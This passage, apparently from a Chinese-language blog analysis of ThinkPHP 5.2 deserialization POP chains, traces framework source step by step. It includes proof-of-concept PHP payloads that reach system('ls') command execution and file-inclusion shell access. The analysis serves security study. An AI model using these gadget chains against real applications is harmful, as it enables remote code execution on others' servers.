    }
    namespace think {
        abstract class Model
        {
            use model\concern\Attribute;
            use model\concern\Conversion;
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model
        {
            public function __construct()
            {
                $this->get();
            }
        }
    }
    namespace {
        $conver = new think\model\Pivot();
        $payload = new think\process\pipes\Windows($conver);
        echo urlencode(serialize($payload));
    }
    ?>
think\model\concern\Conversion::toArray
    public function toArray(): array
        {
            $item       = [];
            $hasVisible = false;
            foreach ($this->visible as $key => $val) {    
             //$this->visible默认值为空，无关函数，跳过            
             ......
            }
            foreach ($this->hidden as $key => $val) {          
            //$this->hidden默认值为空，无关函数，跳过
            ......
            }
            // 合并关联数据
            $data = array_merge($this->data, $this->relation); //在poc中给了$this->data=["lin" => "ls"],所以$data = ["lin" => "ls"]
            foreach ($data as $key => $val) {  //$key = lin,$val=ls
                if ($val instanceof Model || $val instanceof ModelCollection) { //判断$val是不是这两个类的实例，不是，跳过执行下一步
                    // 关联模型对象
                    if (isset($this->visible[$key])) {
                        $val->visible($this->visible[$key]);
                    } elseif (isset($this->hidden[$key])) {
                        $val->hidden($this->hidden[$key]);
                    }
                    // 关联模型对象
                    $item[$key] = $val->toArray();
                } elseif (isset($this->visible[$key])) {   //$this->visible[$key]值为空不存在，跳过
                    $item[$key] = $this->getAttr($key);
                } elseif (!isset($this->hidden[$key]) && !$hasVisible) {  //符合
                    $item[$key] = $this->getAttr($key); //跟进getAttr,
                }
            }
           ......
        }
think\model\concern\Attribute::getAttr
    public function getAttr(string $name) //$name=$key='lin'
        {
            try {
                $relation = false;
                $value    = $this->getData($name); //跟进getData,得知$value='ls'
            } catch (InvalidArgumentException $e) {
                $relation = true;
                $value    = null;
            }
            return $this->getValue($name, $value, $relation);//此时$name=‘lin’ $value=‘ls’ $relation=false, 跟进getValue
        }
think\model\concern\Attribute::getData
    public function getData(string $name = null) //$name='lin'
        {
            if (is_null($name)) {
                return $this->data;
            }
            $fieldName = $this->getRealFieldName($name);  //跟进getRealFieldName 得知$fieldName='lin'
            if (array_key_exists($fieldName, $this->data)) {//$this->data=['lin'=>'ls']
                return $this->data[$fieldName]; //返回'ls'，回到getAttr
            } elseif (array_key_exists($name, $this->relation)) {
                return $this->relation[$name];
            }
            throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
        }
think\model\concern\Attribute::getRealFieldName
    protected function getRealFieldName(string $name): string  //$name='lin'
        {
            return $this->strict ? $name : App::parseName($name); //$this->strict=$name='lin'
        }
`$this->strict`为判断是否严格字段大小写的标志，默认为true，因此getRealFieldName默认返回`$name`参数的值，回到getData看。
think\model\concern\Attribute::getValue
    protected function getValue(string $name, $value, bool $relation = false)
        {                 //$name='lin' $value=‘ls’ $relation=false
            // 检测属性获取器
            $fieldName = $this->getRealFieldName($name);  //该函数默认返回$name='lin'=$fieldName 
            $method    = 'get' . App::parseName($name, 1) . 'Attr';  //拼接字符：getlinAttr
            if (isset($this->withAttr[$fieldName])) {  //withAttr可控['lin'=>'system']
                if ($relation) { //$relation=false
                    $value = $this->getRelationValue($name);
                }
                $closure = $this->withAttr[$fieldName]; //$closure='system'
                $value   = $closure($value, $this->data);//system('ls',$this->data)，命令执行
            }
            .......
            return $value;
        }
最终在getValue处动态调用函数命令执行。
**方法二：**
这种方法跟上面基本一样，唯一不同的就是在getValue处利用tp自带的SerializableClosure调用，而不是上面找的system()。  
[\Opis\Closure](https://github.com/opis/closure)可用于序列化匿名函数，使得匿名函数同样可以进行序列化操作。在`Opis\Closure\SerializableClosure->__invoke()`中有`call_user_func`函数，当尝试以调用函数的方式调用一个对象时，`__invoke()`方法会被自动调用。`call_user_func_array($this->closure,
func_get_args());`  
这意味着我们可以序列化一个匿名函数，然后交由上述的`$closure($value,
$this->data)`调用，将会触发SerializableClosure.php的`__invoke`执行
    $func = function(){phpinfo();};
    $closure = new \Opis\Closure\SerializableClosure($func);
    $closure($value, $this->data);// 这里的参数可以不用管
以上述代码为例，将调用phpinfo函数。  
**POC**
    data = ["lin"=>''];
            # withAttr中的键值要与data中的键值相等
            $this->withAttr = ['lin'=> new SerializableClosure(function(){system('ls');}) ];
        }
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {
    }
    namespace think\process\pipes;
    use think\model\Pivot;
    class Windows
    {
        private $files = [];
        public function __construct()
        {
            $this->files=[new Pivot()];
        }
    }
    echo urlencode(serialize(new Windows()));
    ?>
**方法三：**  
这个方法相比前面有点鸡肋，利用条件可知路径能上传php文件。  
方法就是与5.1版本相似，因为此版本移除了Reuqest类中的`__call`方法，所以师傅们又找了另一个可以用的`__call`方法，在\think\Db.php中存在`__call`方法。下面分析一下该方法。
**POC**
    rootPath = $rootPath;
            $this->runtimePath = "D:/phpstudy/PHPTutorial/WWW/thinkphp/tp5.2/";
            $this->route = new \think\route\RuleName();
        }
    }
    class Db{
        protected $connection;
        protected $config;
        function __construct(){
            $this->config = ['query'=>'\think\Url'];
            $this->connection = new \think\App();
        }
    }
    abstract class Model{
        protected $append = [];
        private $data = [];
        function __construct(){
            # append键必须存在，并且与$this->data相同
            $this->append = ["lin"=>[]];
            $this->data = ["lin"=>new \think\Db()];
        }
    }
    namespace think\route;
    class RuleName{
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {
    }
    namespace think\process\pipes;
    use think\model\Pivot;
    class Windows
    {
        private $files = [];
        public function __construct()
        {
            $this->files=[new Pivot()];
        }
    }
    //var_dump(new Windows());
    echo urlencode(serialize(new Windows()));
    ?>
依然从toArray()说起，，
就用到这个地方前面没用到，poc里定义`$this->append =
["lin"=>[]];`，所以如上图，然后再看调用了一个appendAttrToArray方法，跟进
其实这里内容就是5.1版本toArray里的，只不过放在这个方法里了。具体调用方法和5.1基本一样，不再说了。  
然后继续看触发的`__call`方法，在创建Db对象时同时会触发对象里的`__construct()`，其内容
    function __construct(){
            $this->config = ['query'=>'\think\Url'];
            $this->connection = new \think\App();
        }
所以如下
查看`think\Url::__construct`
    public function __construct(App $app, array $config = [])
        {
            $this->app    = $app;
            $this->config = $config;
            if (is_file($app->getRuntimePath() . 'route.php')) { 
                // 读取路由映射文件
                $app->route->import(include $app->getRuntimePath() . 'route.php');
            }
        }
在\think\Url.php中该构造器引入了RuntimePath下的route.php文件，利用条件就是上传一个带shell的  
route.php就可以了。  
`$app`为可控变量，直接修改`$runtimePath`的内容即可控制`$app->getRuntimePath()`的值，因为getRuntimePath()在think\App类中，所以在poc中构造了App类控制路径，这里会触发App类中的`__construct`方法。
在poc中构造App类
    class App{
        protected $runtimePath;
        public function __construct(string $rootPath = ''){
            $this->rootPath = $rootPath;
            $this->runtimePath = "D:/phpstudy/PHPTutorial/WWW/thinkphp/tp5.2/";
            $this->route = new \think\route\RuleName();
        }
    }
回过来看`think\Url::__construct`，路径和文件都有了，从而包含文件getshell。
## 后记
关于tp反序列化漏洞最大的利用点就是在后期开发时要遇到可控的反序列化点，不然利用不了，不得不说师傅们都tql，各种挖掘思路层出不穷，原来并未分析过tp，这里有分析不当的还请师傅们指点，通过对上面pop链的研究，也增强了自己对thinkphp框架的理解2333。
参考文章：  